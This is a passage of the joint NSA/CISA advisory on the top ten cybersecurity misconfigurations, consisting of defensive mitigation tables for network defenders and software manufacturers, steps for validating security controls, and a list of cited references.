Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the
National Institute of Standards and Technology (NIST) as well as with the MITRE
ATT&CK Enterprise Mitigations and MITRE D3FEND frameworks.
The CPGs provide a minimum set of practices and protections that CISA and NIST
recommend all organizations implement. CISA and NIST based the CPGs on existing
cybersecurity frameworks and guidance to protect against the most common and
impactful threats, tactics, techniques, and procedures. Visit CISA
s Cross-Sector
Cybersecurity Performance Goals for more information on the CPGs, including
additional recommended baseline protections.[24]
Mitigate default configurations of software and applications
Table 1: Recommendations for network defenders to mitigate default configurations of software
and applications
Misconfiguration
Recommendations for Network Defenders
Default
configurations of
software and
applications
Modify the default configuration of applications and
appliances before deployment in a production
environment [M1013],[D3-ACH]. Refer to hardening
guidelines provided by the vendor and related
cybersecurity guidance (e.g., DISA's Security Technical
Implementation Guides (STIGs) and configuration
guides).[25],[26],[27]
Default
configurations of
software and
applications: Default
Credentials
Change or disable vendor-supplied default
usernames and passwords of services, software, and
equipment when installing or commissioning [CPG 2.A].
When resetting passwords, enforce the use of 
strong
passwords (i.e., passwords that are more than 15
characters and random [CPG 2.B]) and follow hardening
guidelines provided by the vendor, STIGs, NSA, and/or
NIST [M1027],[D3-SPP].[25],[26],[28],[29]
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Default service
permissions and
configuration
settings: Insecure
Active Directory
Certificate Services
Ensure the secure configuration of ADCS
implementations. Regularly update and patch the
controlling infrastructure (e.g., for CVE-2021-36942),
employ monitoring and auditing mechanisms, and
implement strong access controls to protect the
infrastructure.
o If not needed, disable web-enrollment in ADCS
servers. See Microsoft: Uninstall-AdcsWebEnrollment
(ADCSDeployment) for guidance.[30]
o If web enrollment is needed on ADCS servers:
 Enable Extended Protection for Authentication
(EPA) for Client Authority Web Enrollment. This
is done by choosing the 
Required
 option. For
guidance, see Microsoft: KB5021989: Extended
Protection for Authentication.[31]
 Enable 
Require SSL
 on the ADCS server.
o Disable NTLM on all ADCS servers. For guidance,
see Microsoft: Network security Restrict NTLM in this
domain - Windows Security | Microsoft Learn and
Network security Restrict NTLM Incoming NTLM traffic
- Windows Security.[32],[33]
o Disable SAN for UPN Mapping. For guidance see,
Microsoft: How to disable the SAN for UPN mapping Windows Server. Instead, smart card authentication
can use the altSecurityIdentities attribute for explicit
mapping of certificates to accounts more securely.[34]
 Review all permissions on the ADCS templates on
applicable servers. Restrict enrollment rights to only
those users or groups that require it. Disable the
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag from
templates to prevent users from supplying and editing
sensitive security settings within these templates.
Enforce manager approval for requested certificates.
Remove FullControl, WriteDacl, and Write property
permissions from low-privileged groups, such as domain
users, to certificate template objects.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Default service
permissions and
configuration
settings: Insecure
legacy
protocols/services
Determine if LLMNR and NetBIOS are required for
essential business operations.
o If not required, disable LLMNR and NetBIOS in local
computer security settings or by group policy.
Default service
permissions and
configuration
settings: Insecure
SMB service
Require SMB signing for both SMB client and server on
all systems.[25] This should prevent certain adversary-inthe-middle and pass-the-hash techniques. For more
information on SMB signing, see Microsoft: Overview of
Server Message Block Signing. [35] Note: Beginning in
Microsoft Windows 11 Insider Preview Build 25381,
Windows requires SMB signing for all
communications.[36]
Mitigate improper separation of user/administrator privilege
Table 2: Recommendations for network defenders to mitigate improper separation of
user/administrator privilege
Misconfiguration
Recommendations for Network Defenders
Improper separation
of user/administrator
privilege:
 Excessive
account
privileges,
 Elevated
service account
permissions,
 Non-essential
use of elevated
accounts
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Implement authentication, authorization, and
accounting (AAA) systems [M1018] to limit actions
users can perform, and review logs of user actions to
detect unauthorized use and abuse. Apply least privilege
principles to user accounts and groups allowing only the
performance of authorized actions.
Audit user accounts and remove those that are inactive
or unnecessary on a routine basis [CPG 2.D]. Limit the
ability for user accounts to create additional accounts.
Restrict use of privileged accounts to perform general
tasks, such as accessing emails and browsing the
Internet [CPG 2.E],[D3-UAP]. See NSA Cybersecurity
Information Sheet (CSI) Defend Privileges and Accounts
for more information.[37]
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Limit the number of users within the organization with
an identity and access management (IAM) role that
has administrator privileges. Strive to reduce all
permanent privileged role assignments, and conduct
periodic entitlement reviews on IAM users, roles, and
policies.
Implement time-based access for privileged accounts.
For example, the just-in-time access method provisions
privileged access when needed and can support
enforcement of the principle of least privilege (as well as
the Zero Trust model) by setting network-wide policy to
automatically disable admin accounts at the Active
Directory level. As needed, individual users can submit
requests through an automated process that enables
access to a system for a set timeframe. In cloud
environments, just-in-time elevation is also appropriate
and may be implemented using per-session federated
claims or privileged access management tools.
Restrict domain users from being in the local
administrator group on multiple systems.
Run daemonized applications (services) with nonadministrator accounts when possible.
Only configure service accounts with the permissions
necessary for the services they control to operate.
Disable unused services and implement ACLs to
protect services.
Mitigate insufficient internal network monitoring
Table 3: Recommendations for network defenders to mitigate insufficient internal network
monitoring
Misconfiguration
Recommendations for Network Defenders
Insufficient internal
network monitoring
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Establish a baseline of applications and services, and
routinely audit their access and use, especially for
administrative activity [D3-ANAA]. For instance,
administrators should routinely audit the access lists and
permissions for of all web applications and services [CPG
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
2.O],[M1047]. Look for suspicious accounts, investigate
them, and remove accounts and credentials, as
appropriate, such as accounts of former staff.[39]
Establish a baseline that represents an organization
normal traffic activity, network performance, host
application activity, and user behavior; investigate any
deviations from that baseline [D3-NTCD],[D3-CSPP],[D3UBA].[40]
Use auditing tools capable of detecting privilege and
service abuse opportunities on systems within an
enterprise and correct them [M1047].
Implement a security information and event
management (SIEM) system to provide log aggregation,
correlation, querying, visualization, and alerting from
network endpoints, logging systems, endpoint and
detection response (EDR) systems and intrusion
detection systems (IDS) [CPG 2.T],[D3-NTA].
Mitigate lack of network segmentation
Table 4: Recommendations for network defenders to mitigate lack of network segmentation
Misconfiguration
Recommendations for Network Defenders
Lack of network
segmentation
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Implement next-generation firewalls to perform deep
packet filtering, stateful inspection, and application-level
packet inspection [D3-NTF]. Deny or drop improperly
formatted traffic that is incongruent with applicationspecific traffic permitted on the network. This practice
limits an actor
s ability to abuse allowed application
protocols. The practice of allowlisting network applications
does not rely on generic ports as filtering criteria,
enhancing filtering fidelity. For more information on
application-aware defenses, see NSA CSI Segment
Networks and Deploy Application-Aware Defenses.[41]
Engineer network segments to isolate critical
systems, functions, and resources [CPG 2.F],[D3-NI].
Establish physical and logical segmentation controls, such
as virtual local area network (VLAN) configurations and
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
properly configured access control lists (ACLs) on
infrastructure devices [M1030]. These devices should be
baselined and audited to prevent access to potentially
sensitive systems and information. Leverage properly
configured Demilitarized Zones (DMZs) to reduce service
exposure to the Internet.[42],[43],[44]
Implement separate Virtual Private Cloud (VPC)
instances to isolate essential cloud systems. Where
possible, implement Virtual Machines (VM) and Network
Function Virtualization (NFV) to enable microsegmentation of networks in virtualized environments and
cloud data centers. Employ secure VM firewall
configurations in tandem with macro segmentation.
Mitigate poor patch management
Table 5: Recommendations for network defenders to mitigate poor patch management
Misconfiguration
Recommendations for Network Defenders
Poor patch
management: Lack
of regular patching
Poor patch
management: Use
of unsupported OSs
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Ensure organizations implement and maintain an
efficient patch management process that enforces the
use of up-to-date, stable versions of OSs, browsers, and
software [M1051],[D3-SU].[45]
Update software regularly by employing patch
management for externally exposed applications, internal
enterprise endpoints, and servers. Prioritize patching
known exploited vulnerabilities.[2]
Automate the update process as much as possible
and use vendor-provided updates. Consider using
automated patch management tools and software update
tools.
Where patching is not possible due to limitations,
segment networks to limit exposure of the vulnerable
system or host.
Evaluate the use of unsupported hardware and
software and discontinue use as soon as possible. If
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
and outdated
firmware
discontinuing is not possible, implement additional
network protections to mitigate the risk.[45]
Patch the Basic Input/Output System (BIOS) and other
firmware to prevent exploitation of known vulnerabilities.
Mitigate bypass of system access controls
Table 6: Recommendations for network defenders to mitigate bypass of system access controls
Misconfiguration
Recommendations for Network Defenders
Bypass of system
access controls
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Limit credential overlap across systems to prevent
credential compromise and reduce a malicious actor's
ability to move laterally between systems [M1026],[D3CH]. Implement a method for monitoring non-standard
logon events through host log monitoring [CPG 2.G].
Implement an effective and routine patch
management process. Mitigate PtH techniques by
applying patch KB2871997 to Windows 7 and newer
versions to limit default access of accounts in the local
administrator group [M1051],[D3-SU].[46]
Enable the PtH mitigations to apply User Account
Control (UAC) restrictions to local accounts upon
network logon [M1052],[D3-UAP].
Deny domain users the ability to be in the local
administrator group on multiple systems [M1018],[D3UAP].
Limit workstation-to-workstation communications. All
workstation communications should occur through a
server to prevent lateral movement [M1018],[D3-UAP].
Use privileged accounts only on systems requiring
those privileges [M1018],[D3-UAP]. Consider using
dedicated Privileged Access Workstations for privileged
accounts to better isolate and protect them.[37]
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Mitigate weak or misconfigured MFA methods
Table 7: Recommendations for network defenders to mitigate weak or misconfigured MFA
methods
Misconfiguration
Recommendations for Network Defenders
Weak or
misconfigured MFA
methods:
Misconfigured smart
cards or tokens
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
In Windows environments:
o Disable the use of New Technology LAN Manager
(NTLM) and other legacy authentication protocols
that are susceptible to PtH due to their use of
password hashes [M1032],[D3-MFA]. For guidance,
see Microsoft: Network security Restrict NTLM in this
domain - Windows Security | Microsoft Learn and
Network security Restrict NTLM Incoming NTLM traffic
- Windows Security.[32],[33]
o Use built-in functionality via Windows Hello for
Business or Group Policy Objects (GPOs) to
regularly re-randomize password hashes
associated with smartcard-required accounts. Ensure
that the hashes are changed at least as often as
organizational policy requires passwords to be
changed [M1027],[D3-CRO]. Prioritize upgrading any
environments that cannot utilize this built-in
functionality.
As a longer-term effort, implement cloud-primary
authentication solution using modern open
standards. See CISA
s Secure Cloud Business
Applications (SCuBA) Hybrid Identity Solutions
Architecture for more information.[47] Note: this
document is part of CISA
s Secure Cloud Business
Applications (SCuBA) project, which provides guidance
for FCEB agencies to secure their cloud business
application environments and to protect federal
information that is created, accessed, shared, and stored
in those environments. Although tailored to FCEB
agencies, the project
s guidance is applicable to all
organizations.[48]
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Weak or
misconfigured MFA
methods: Lack of
phishing-resistant
Enforce phishing-resistant MFA universally for access
to sensitive data and on as many other resources and
services as possible [CPG 2.H].[3],[49]
Mitigate insufficient ACLs on network shares and services
Table 8: Recommendations for network defenders to mitigate insufficient ACLs on network shares
and services
Misconfiguration
Recommendations for Network Defenders
Insufficient ACLs on
network shares and
services
Implement secure configurations for all storage
devices and network shares that grant access to
authorized users only.
Apply the principal of least privilege to important
information resources to reduce risk of unauthorized data
access and manipulation.
Apply restrictive permissions to files and directories,
and prevent adversaries from modifying ACLs
[M1022],[D3-LFP].
Set restrictive permissions on files and folders
containing sensitive private keys to prevent unintended
access [M1022],[D3-LFP].
Enable the Windows Group Policy security setting,
"Do Not Allow Anonymous Enumeration of Security
Account Manager (SAM) Accounts and Shares," to
limit users who can enumerate network shares.
Mitigate poor credential hygiene
Table 9: Recommendations for network defenders to mitigate poor credential hygiene
Misconfiguration
Recommendations for Network Defenders
Poor credential
hygiene: easily
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Follow National Institute of Standards and
Technologies (NIST) guidelines when creating
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
crackable
passwords
Poor credential
hygiene: cleartext
password disclosure
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
password policies to enforce use of 
strong
 passwords
that cannot be cracked [M1027],[D3-SPP].[29] Consider
using password managers to generate and store
passwords.
Do not reuse local administrator account passwords
across systems. Ensure that passwords are 
strong
 and
unique [CPG 2.B],[M1027],[D3-SPP].
Use 
strong
 passphrases for private keys to make
cracking resource intensive. Do not store credentials
within the registry in Windows systems. Establish an
organizational policy that prohibits password storage in
files.
Ensure adequate password length (ideally 25+
characters) and complexity requirements for
Windows service accounts and implement passwords
with periodic expiration on these accounts [CPG
2.B],[M1027],[D3-SPP]. Use Managed Service Accounts,
when possible, to manage service account passwords
automatically.
Implement a review process for files and systems to
look for cleartext account credentials. When
credentials are found, remove, change, or encrypt them
[D3-FE]. Conduct periodic scans of server machines
using automated tools to determine whether sensitive
data (e.g., personally identifiable information, protected
health information) or credentials are stored. Weigh the
risk of storing credentials in password stores and web
browsers. If system, software, or web browser credential
disclosure is of significant concern, technical controls,
policy, and user training may prevent storage of
credentials in improper locations.
Store hashed passwords using Committee on
National Security Systems Policy (CNSSP)-15 and
Commercial National Security Algorithm Suite (CNSA)
approved algorithms.[50],[51]
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Consider using group Managed Service Accounts
(gMSAs) or third-party software to implement secure
password-storage applications.
Mitigate unrestricted code execution
Table 10: Recommendations for network defenders to mitigate unrestricted code execution
Misconfiguration
Recommendations for Network Defenders
Unrestricted code
execution
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Enable system settings that prevent the ability to run
applications downloaded from untrusted sources.[52]
Use application control tools that restrict program
execution by default, also known as allowlisting [D3EAL]. Ensure that the tools examine digital signatures and
other key attributes, rather than just relying on filenames,
especially since malware often attempts to masquerade
as common Operating System (OS) utilities [M1038].
Explicitly allow certain .exe files to run, while blocking all
others by default.
Block or prevent the execution of known vulnerable
drivers that adversaries may exploit to execute code
in kernel mode. Validate driver block rules in audit mode
to ensure stability prior to production deployment [D3OSM].
Constrain scripting languages to prevent malicious
activities, audit script logs, and restrict scripting
languages that are not used in the environment [D3SEA]. See joint Cybersecurity Information Sheet: Keeping
PowerShell: Security Measures to Use and Embrace.[53]
Use read-only containers and minimal images, when
possible, to prevent the running of commands.
Regularly analyze border and host-level protections,
including spam-filtering capabilities, to ensure their
continued effectiveness in blocking the delivery and
execution of malware [D3-MA]. Assess whether HTML
Application (HTA) files are used for business purposes in
your environment; if HTAs are not used, remap the default
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
program for opening them from mshta.exe to
notepad.exe.
Software manufacturers
NSA and CISA recommend software manufacturers implement the recommendations in
Table 11 to reduce the prevalence of misconfigurations identified in this advisory. These
mitigations align with tactics provided in joint guide Shifting the Balance of
Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default.
NSA and CISA strongly encourage software manufacturers apply these
recommendations to ensure their products are secure 
out of the box
 and do not
require customers to spend additional resources making configuration changes,
performing monitoring, and conducting routine updates to keep their systems secure.[1]
Table 11: Recommendations for software manufacturers to mitigate identified misconfigurations
Misconfiguration
Default configurations of
software and applications
Recommendations for Software Manufacturers
Default configurations of
software and applications:
Default credentials
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Embed security controls into product
architecture from the start of development
and throughout the entire SDLC by following
best practices in NIST
s Secure Software
Development Framework (SSDF), SP 800218.[54]
Provide software with security features
enabled 
out of the box
 and accompanied
with 
loosening
 guides instead of hardening
guides. 
Loosening
 guides should explain the
business risk of decisions in plain,
understandable language.
Eliminate default passwords: Do not provide
software with default passwords that are
universally shared. To eliminate default
passwords, require administrators to set a
strong
 password [CPG 2.B] during installation
and configuration.
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Default configurations of
software and applications:
Default service permissions
and configuration settings
Consider the user experience consequences
of security settings: Each new setting increases
the cognitive burden on end users and should be
assessed in conjunction with the business benefit
it derives. Ideally, a setting should not exist;
instead, the most secure setting should be
integrated into the product by default. When
configuration is necessary, the default option
should be broadly secure against common
threats.
Improper separation of
user/administrator privilege:
 Excessive account
privileges,
 Elevated service
account permissions,
 Non-essential use of
elevated accounts
Design products so that the compromise of a
single security control does not result in
compromise of the entire system. For
example, ensuring that user privileges are
narrowly provisioned by default and ACLs are
employed can reduce the impact of a
compromised account. Also, software
sandboxing techniques can quarantine a
vulnerability to limit compromise of an entire
application.
Automatically generate reports for:
o Administrators of inactive accounts.
Prompt administrators to set a maximum
inactive time and automatically suspend
accounts that exceed that threshold.
o Administrators of accounts with
administrator privileges and suggest ways
to reduce privilege sprawl.
Automatically alert administrators of
infrequently used services and provide
recommendations for disabling them or
implementing ACLs.
Insufficient internal network
monitoring
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Provide high-quality audit logs to customers
at no extra charge. Audit logs are crucial for
detecting and escalating potential security
incidents. They are also crucial during an
investigation of a suspected or confirmed security
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
incident. Consider best practices such as
providing easy integration with a security
information and event management (SIEM)
system with application programming interface
(API) access that uses coordinated universal time
(UTC), standard time zone formatting, and robust
documentation techniques.
Lack of network
segmentation
Ensure products are compatible with and
tested in segmented network environments.
Poor patch management:
Lack of regular patching
Take steps to eliminate entire classes of
vulnerabilities by embedding security
controls into product architecture from the
start of development and throughout the
SDLC by following best practices in NIST
SSDF, SP 800-218.[54] Pay special attention to:
o Following secure coding practices [SSDF
PW 5.1]. Use memory-safe programming
languages where possible, parametrized
queries, and web template languages.
o Conducting code reviews [SSDF PW 7.2,
RV 1.2] against peer coding standards,
checking for backdoors, malicious content,
and logic flaws.
o Testing code to identify vulnerabilities and
verify compliance with security requirements
[SSDF PW 8.2].
Ensure that published CVEs include root
cause or common weakness enumeration
(CWE) to enable industry-wide analysis of
software security design flaws.
Poor patch management:
Use of unsupported
operating OSs and outdated
firmware
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
Communicate the business risk of using
unsupported OSs and firmware in plain,
understandable language.
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Bypass of system access
controls
Provide sufficient detail in audit records to
detect bypass of system controls and queries
to monitor audit logs for traces of such suspicious
activity (e.g., for when an essential step of an
authentication or authorization flow is missing).
Weak or Misconfigured MFA
Methods: Misconfigured
Smart Cards or Tokens
Fully support MFA for all users, making MFA
the default rather than an opt-in feature. Utilize
threat modeling for authentication assertions and
alternate credentials to examine how they could
be abused to bypass MFA requirements.
Weak or Misconfigured MFA
Methods: Lack of phishingresistant MFA
Mandate MFA, ideally phishing-resistant, for
privileged users and make MFA a default rather
than an opt-in feature.[3]
Insufficient ACL on network
shares and services
Enforce use of ACLs with default ACLs only
allowing the minimum access needed, along with
easy-to-use tools to regularly audit and adjust
ACLs to the minimum access needed.
Poor credential hygiene:
easily crackable passwords
Allow administrators to configure a password
policy consistent with NIST
s guidelines
not require counterproductive restrictions such as
enforcing character types or the periodic rotation
of passwords.[29]
Allow users to use password managers to
effortlessly generate and use secure, random
passwords within products.
Poor credential hygiene:
cleartext password
disclosure
Salt and hash passwords using a secure
hashing algorithm with high computational cost
to make brute force cracking more difficult.
Unrestricted code execution
Support execution controls within operating
systems and applications 
out of the box
default at no extra charge for all customers, to
limit malicious actors
 ability to abuse functionality
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
or launch unusual applications without
administrator or informed user approval.
Validate security controls
In addition to applying mitigations, NSA and CISA recommend exercising, testing, and
validating your organization
s security program against the threat behaviors mapped to
the MITRE ATT&CK for Enterprise framework in this advisory. NSA and CISA
recommend testing your existing security controls inventory to assess how they perform
against the ATT&CK techniques described in this advisory.
To get started:
1. Select an ATT&CK technique described in this advisory (see Table 12
Table 21).
2. Align your security technologies against the technique.
3. Test your technologies against the technique.
4. Analyze your detection and prevention technologies
 performance.
5. Repeat the process for all security technologies to obtain a set of comprehensive
performance data.
6. Tune your security program, including people, processes, and technologies,
based on the data generated by this process.
CISA and NSA recommend continually testing your security program, at scale, in a
production environment to ensure optimal performance against the MITRE ATT&CK
techniques identified in this advisory.
Learn from history
The misconfigurations described above are all too common in assessments and the
techniques listed are standard ones leveraged by multiple malicious actors, resulting in
numerous real network compromises. Learn from the weaknesses of others and
implement the mitigations above properly to protect the network, its sensitive
information, and critical missions.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Works cited
Joint Guide: Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Securityby-Design and -Default (2023), https://www.cisa.gov/sites/default/files/202306/principles_approaches_for_security-by-design-default_508c.pdf
CISA, Known Exploited Vulnerabilities Catalog, https://www.cisa.gov/known-exploitedvulnerabilities-catalog
CISA, Implementing Phishing-Resistant MFA,
https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistantmfa-508c.pdf
MITRE, ATT&CK for Enterprise, https://attack.mitre.org/versions/v13/matrices/enterprise/
MITRE, D3FEND, https://d3fend.mitre.org/
CISA, Best Practices for MITRE ATT&CK Mapping, https://www.cisa.gov/newsevents/news/best-practices-mitre-attckr-mapping
CISA, Decider Tool, https://github.com/cisagov/Decider/
CISA, Cyber Assessment Fact Sheet,
https://www.cisa.gov/sites/default/files/publications/VM_Assessments_Fact_Sheet_RVA_508C.p
Joint CSA: Weak Security Controls and Practices Routinely Exploited for Initial Access,
https://media.defense.gov/2022/May/17/2002998718/-1/1/0/CSA_WEAK_SECURITY_CONTROLS_PRACTICES_EXPLOITED_FOR_INITIAL_ACCESS
.PDF
[10] Microsoft KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services
(AD CS), https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-onactive-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429
[11] Raj Chandel, Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints,
https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/
[12] SpecterOps - Will Schroeder, Certified Pre-Owned, https://posts.specterops.io/certified-preowned-d95910965cd2
[13] CISA, CSA: CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of
Networks, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a
[14] Joint CSA: Threat Actors Exploit Progress Telerik Vulnerabilities in Multiple U.S. Government IIS
Servers. https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a
[15] Joint CSA: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy
Crypto Miner, Credential Harvester. https://www.cisa.gov/news-events/cybersecurityadvisories/aa22-320a
[16] Joint CSA: Threat Actors Exploiting Multiple CVEs Against Zimbra Collaboration Suite.
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-228a
[17] Microsoft, How to verify that MS17-010 is installed, https://support.microsoft.com/enus/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8
[18] Microsoft, Microsoft Security Bulletin MS08-067 
 Critical Vulnerability in Server Service Could
Allow Remote Code Execution (958644), https://learn.microsoft.com/en-us/securityupdates/SecurityBulletins/2008/ms08-067
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
[19] Joint CSA: Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense
Industrial Base Organization, https://www.cisa.gov/news-events/cybersecurity-advisories/aa22277a
[20] CISA, Malware Analysis Report: 10365227.r1.v1, https://www.cisa.gov/sites/default/files/202306/mar-10365227.r1.v1.clear_.pdf
[21] Joint CSA: #StopRansomware: BianLian Ransomware Group. https://www.cisa.gov/newsevents/cybersecurity-advisories/aa23-136a
[22] CISA Analysis Report: FiveHands Ransomware. https://www.cisa.gov/news-events/analysisreports/ar21-126a
[23] Snaffler, https://github.com/SnaffCon/Snaffler
[24] CISA, Cross-Sector Cybersecurity Performance Goals, https://www.cisa.gov/cross-sectorcybersecurity-performance-goals
[25] Defense Information Systems Agency (DISA), Security Technical Implementation Guides
(STIGs), https://public.cyber.mil/stigs/
[26] NSA, Network Infrastructure Security Guide,
https://media.defense.gov/2022/Jun/15/2003018261/-1/1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDE_20220615.PDF
[27] NSA, Actively Manage Systems and Configurations,
https://media.defense.gov/2019/Sep/09/2002180326/-1/1/0/Actively%20Manage%20Systems%20and%20Configurations.docx%20-%20Copy.pdf
[28] NSA, Cybersecurity Advisories & Guidance, https://www.nsa.gov/cybersecurity-guidance
[29] National Institute of Standards and Technologies (NIST), NIST SP 800-63B: Digital Identity
Guidelines: Authentication and Lifecycle Management,
https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final
[30] Microsoft, Uninstall-AdcsWebEnrollment, https://learn.microsoft.com/enus/powershell/module/adcsdeployment/uninstall-adcswebenrollment
[31] Microsoft, KB5021989: Extended Protection for Authentication, https://support.microsoft.com/enau/topic/kb5021989-extended-protection-for-authentication-1b6ea84d-377b-4677-a0b8af74efbb243f
[32] Microsoft, Network security: Restrict NTLM: NTLM authentication in this domain,
https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policysettings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain
[33] Microsoft, Network security: Restrict NTLM: Incoming NTLM traffic,
https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policysettings/network-security-restrict-ntlm-incoming-ntlm-traffic
[34] Microsoft, How to disable the Subject Alternative Name for UPN mapping,
https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/disable-subjectalternative-name-upn-mapping
[35] Microsoft, Overview of Server Message Block signing, https://learn.microsoft.com/enus/troubleshoot/windows-server/networking/overview-server-message-block-signing
[36] Microsoft, SMB signing required by default in Windows Insider,
https://aka.ms/SmbSigningRequired
[37] NSA, Defend Privileges and Accounts, https://media.defense.gov/2019/Sep/09/2002180330/-1/1/0/Defend%20Privileges%20and%20Accounts%20-%20Copy.pdf
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
[38] NSA, Advancing Zero Trust Maturity Throughout the User Pillar,
https://media.defense.gov/2023/Mar/14/2003178390/-1/1/0/CSI_Zero_Trust_User_Pillar_v1.1.PDF
[39] NSA, Continuously Hunt for Network Intrusions,
https://media.defense.gov/2019/Sep/09/2002180360/-1/1/0/Continuously%20Hunt%20for%20Network%20Intrusions%20-%20Copy.pdf
[40] Joint CSI: Detect and Prevent Web Shell Malware,
https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENTWEB-SHELL-MALWARE-20200422.PDF
[41] NSA, Segment Networks and Deploy Application-aware Defenses,
https://media.defense.gov/2019/Sep/09/2002180325/-1/1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20%20Copy.pdf
[42] Joint CSA: NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all
Operational Technologies and Control Systems,
https://media.defense.gov/2020/Jul/23/2002462846/-1/-1/0/OT_ADVISORY-DUAL-OFFICIAL20200722.PDF
[43] NSA, Stop Malicious Cyber Activity Against Connected Operational Technology,
https://media.defense.gov/2021/Apr/29/2002630479/-1/-1/0/CSA_STOP-MCA-AGAINSTOT_UOO13672321.PDF
[44] NSA, Performing Out-of-Band Network Management,
https://media.defense.gov/2020/Sep/17/2002499616/-1/1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF
[45] NSA, Update and Upgrade Software Immediately,
https://media.defense.gov/2019/Sep/09/2002180319/-1/1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20-%20Copy.pdf
[46] Microsoft, Microsoft Security Advisory 2871997: Update to Improve Credentials Protection and
Management, https://learn.microsoft.com/en-us/securityupdates/SecurityAdvisories/2016/2871997
[47] CISA, Secure Cloud Business Applications Hybrid Identity Solutions Architecture,
https://www.cisa.gov/sites/default/files/2023-03/csso-scuba-guidance_documenthybrid_identity_solutions_architecture-2023.03.22-final.pdf
[48] CISA, Secure Cloud Business Applications (SCuBA) Project, https://www.cisa.gov/resourcestools/services/secure-cloud-business-applications-scuba-project
[49] NSA, Transition to Multi-factor Authentication,
https://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multifactor%20Authentication%20-%20Copy.pdf
[50] Committee on National Security Systems (CNSS), CNSS Policy 15,
https://www.cnss.gov/CNSS/issuances/Policies.cfm
[51] NSA, NSA Releases Future Quantum-Resistant (QR) Algorithm Requirements for National
